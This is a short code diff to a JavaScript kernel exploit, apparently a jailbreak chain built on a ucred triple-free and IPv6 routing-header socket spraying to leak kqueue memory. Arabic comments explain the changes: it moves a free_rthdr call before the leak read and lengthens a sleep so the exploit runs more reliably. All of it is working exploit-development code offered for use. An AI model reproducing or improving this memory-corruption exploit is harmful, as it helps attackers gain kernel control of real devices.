@@ -1628,8 +1628,6 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking ...');
 
-
-
   var kq = new BigInt(0);
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
@@ -1653,7 +1651,8 @@ function leak_kqueue() {
     // توازن إيقاع: ندي الكيرنل نفس ياخده
     sched_yield();
     nanosleep_fun(2); // كانت 1، خليناها 2 علشان ثبات أعلى
-
+    // نحرر triplets[1] عشان نستخدمه في التسريب
+    free_rthdr(ipv6_socks[triplets[1]]);
     // محاولة التسريب
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
@@ -1687,8 +1686,7 @@ function leak_kqueue() {
 
   // إعادة بناء triplets[1]
   triplets[1] = find_triplet(triplets[0], triplets[2]);
-    // نحرر triplets[1] عشان نستخدمه في التسريب
-  free_rthdr(ipv6_socks[triplets[1]]);
+
   return true;
 }
 function leak_kqueue_safe() {
